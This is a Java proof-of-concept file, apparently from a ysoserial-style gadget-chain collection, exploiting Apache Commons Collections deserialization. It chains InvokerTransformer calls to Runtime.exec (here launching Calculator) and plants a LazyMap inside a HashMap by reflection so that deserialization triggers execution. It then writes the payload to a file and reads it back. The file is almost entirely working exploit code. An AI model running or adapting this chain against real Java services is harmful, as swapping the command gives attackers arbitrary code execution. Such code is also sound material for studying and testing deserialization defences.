package ysoserial.payloads.tabbyGadgetChains.CommonCollections3;

import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * <java.util.HashMap: void readObject(java.io.ObjectInputStream)>
 * -><java.util.HashMap: java.lang.Object putVal(int,java.lang.Object,java.lang.Object,boolean,boolean)>
 * -><java.util.Hashtable: boolean equals(java.lang.Object)>
 * -><org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
 *     ...
 */

public class CC3_Poc3 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        outerMap.put(333,333);

        Hashtable hashtable =new Hashtable();
        hashtable.put(111,1111);

        Hashtable hashtable1 = new Hashtable();
        hashtable1.put(222,222);

        // Use the colliding Maps as keys in Hashtable
        HashMap hashMap = new HashMap();
        hashMap.put(1, 1);
        hashMap.put(2,2);
        hashMap.put(3, 3);


        Field tableField = hashMap.getClass().getDeclaredField("table");
        Permit.setAccessible(tableField);
        Object[] table = (Object[]) tableField.get(hashMap);
        int j = 0;
        for (int i=0;i < table.length;i++){
            Object entry1 = table[i];
            if(entry1 != null) {
                if (j==0){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, outerMap);
                    j++;
                }else if (j==1){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, hashtable);
                    j++;
                }else if (j==2){
                    Field keyField = entry1.getClass().getDeclaredField("key");
                    Permit.setAccessible(keyField);
                    keyField.set(entry1, hashtable1);
                    j++;
                }

            }
        }

        //        serialize
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./ccf3"));
        outputStream.writeObject(hashMap);
        outputStream.close();


//        //        deserialize
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./ccf3"));
        inputStream.readObject();
    }
}
